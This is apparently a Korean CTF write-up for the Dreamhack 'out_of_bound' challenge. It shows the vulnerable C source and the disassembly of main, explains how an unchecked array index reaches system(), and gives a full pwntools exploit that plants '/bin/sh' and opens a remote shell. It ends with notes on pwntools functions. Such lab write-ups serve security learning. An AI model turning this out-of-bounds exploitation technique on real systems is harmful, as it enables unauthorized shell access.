out_of_bound
===

# Description

> 이 문제는 서버에서 작동하고 있는 서비스(out_of_bound)의 바이너리와 소스 코드가 주어집니다.
> 프로그램의 취약점을 찾고 익스플로잇해 셸을 획득하세요.
> “flag” 파일을 읽어 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
> 플래그의 형식은 DH{…} 입니다.

# Source code

> \#include &#60;stdio.h&#62;
>
> \#include &#60;stdlib.h&#62;
>
> \#include &#60;signalA.h&#62;
>
> \#include &#60;unistd.h&#62;
>
> \#include &#60;string.h&#62;
>
> 
>
> char name[16];
>
> 
>
> char *command[10] = { "cat",
>
>   "ls",
>
>   "id",
>
>   "ps",
>
>   "file ./oob" };
>
> void alarm_handler()
>
> {
>
>   puts("TIME OUT");
>
>   exit(-1);
>
> }
>
> 
>
> void initialize()
>
> {
>
>   setvbuf(stdin, NULL, _IONBF, 0);
>
>   setvbuf(stdout, NULL, _IONBF, 0);
>
> 
>
>   signal(SIGALRM, alarm_handler);
>
>   alarm(30);
>
> }
>
> 
>
> int main()
>
> {
>
>   int idx;
>
> 
>
>   initialize();
>
> 
>
>   printf("Admin name: ");
>
>   read(0, name, sizeof(name));
>
>   printf("What do you want?: ");
>
> 
>
>   scanf("%d", &idx);
>
> 
>
>   system(command[idx]);
>
> 
>
>   return 0;
>
> }

system이라는 명령어 에서는 안에있는 명령어를 실행한다. command는 index를 확인하지 않기 때문에 이를 이용한다. 그런데 command는 포인터 이므로 포인터를 이용해야 한다. 따라서 name[0]~name[3]은 name[4]의 주솟값을 넣고, name[4]에 /bin/sh를 넣는다. command의 index를 이용해 이 코드가 실행되도록 한다. 

# Result

> ~~~
> Dump of assembler code for function main:
> 0x080486cb <+0&#62;:	lea    ecx,[esp+0x4]
> 0x080486cf <+4&#62;:	and    esp,0xfffffff0
> 0x080486d2 <+7&#62;:	push   DWORD PTR [ecx-0x4]
> 0x080486d5 <+10&#62;:	push   ebp
> 0x080486d6 <+11&#62;:	mov    ebp,esp
> 0x080486d8 <+13&#62;:	push   ecx
> 0x080486d9 <+14&#62;:	sub    esp,0x14
> 0x080486dc <+17&#62;:	mov    eax,gs:0x14
> 0x080486e2 <+23&#62;:	mov    DWORD PTR [ebp-0xc],eax
> 0x080486e5 <+26&#62;:	xor    eax,eax
> 0x080486e7 <+28&#62;:	call   0x804867b <initialize&#62;
> 0x080486ec <+33&#62;:	sub    esp,0xc
> 0x080486ef <+36&#62;:	push   0x8048811
> 0x080486f4 <+41&#62;:	call   0x80484b0 <printf@plt&#62;
> 0x080486f9 <+46&#62;:	add    esp,0x10
> 0x080486fc <+49&#62;:	sub    esp,0x4
> 0x080486ff <+52&#62;:	push   0x10
> 0x08048701 <+54&#62;:	push   0x804a0ac
> 0x08048706 <+59&#62;:	push   0x0
> 0x08048708 <+61&#62;:	call   0x80484a0 <read@plt&#62;
> 0x0804870d <+66&#62;:	add    esp,0x10
> 0x08048710 <+69&#62;:	sub    esp,0xc
> 0x08048713 <+72&#62;:	push   0x804881e
> 0x08048718 <+77&#62;:	call   0x80484b0 <printf@plt&#62;
> 0x0804871d <+82&#62;:	add    esp,0x10
> 0x08048720 <+85&#62;:	sub    esp,0x8
> 0x08048723 <+88&#62;:	lea    eax,[ebp-0x10]
> 0x08048726 <+91&#62;:	push   eax
> 0x08048727 <+92&#62;:	push   0x8048832
> 0x0804872c <+97&#62;:	call   0x8048540 <&#95;_scanf@plt&#62;
> 0x08048731 <+102&#62;:	add    esp,0x10
> 0x08048734 <+105&#62;:	mov    eax,DWORD PTR [ebp-0x10]
> 0x08048737 <+108&#62;:	mov    eax,DWORD PTR [eax*4+0x804a060]
> 0x0804873e <+115&#62;:	sub    esp,0xc
> 0x08048741 <+118&#62;:	push   eax
> 0x08048742 <+119&#62;:	call   0x8048500 <system@plt&#62;
> 0x08048747 <+124&#62;:	add    esp,0x10
> 0x0804874a <+127&#62;:	mov    eax,0x0
> 0x0804874f <+132&#62;:	mov    edx,DWORD PTR [ebp-0xc]
> 0x08048752 <+135&#62;:	xor    edx,DWORD PTR gs:0x14
> 0x08048759 <+142&#62;:	je     0x8048760 <main+149&#62;
> 0x0804875b <+144&#62;:	call   0x80484e0 <__stack_chk_fail@plt&#62;
> 0x08048760 <+149&#62;:	mov    ecx,DWORD PTR [ebp-0x4]
> 0x08048763 <+152&#62;:	leave  
> 0x08048764 <+153&#62;:	lea    esp,[ecx-0x4]
> 0x08048767 <+156&#62;:	ret 
> ~~~
>
> 

소스코드는 다음과 같다. 입력이 되는 61번 read와 system의 119번을 보고 name과 commend의 주솟값을 알아보겠다.

> 



> 



> 



> ~~~
> from pwn import *
> 
> p=remote("host1.dreamhack.games",8257)
> payload=p32(0x804a0b0)
> payload+="/bin/sh"
> p.recvuntil(": ")
> p.sendline(payload)
> p.recvuntil(": ")
> p.sendline("19")
> p.interactive()
> ~~~

out_of_bound를 공격하기 위한 코드는 다음과 같다.

# Learned

> gdb-peda를 이용하면 함수에 들어가는 인자를 알 수 있다.
>
> remote(주소,포트)를 통해 원격 저장소에 연결 할 수 있다.
>
> prcess(파일주소)를 통해 local에 있는 파일에 연결할 수 있다.
>
> p32는 32bit little endian으로 packing해준다. 64bit은 p64를 이용한다.
>
> recvuntil은 주어진 문자열이 나올 때 까지 받는다.
>
> sendline은 주어진 문자열을 보낸다.
>
> interactive는 연결된 곳에 상호작용 할 수 있게 한다.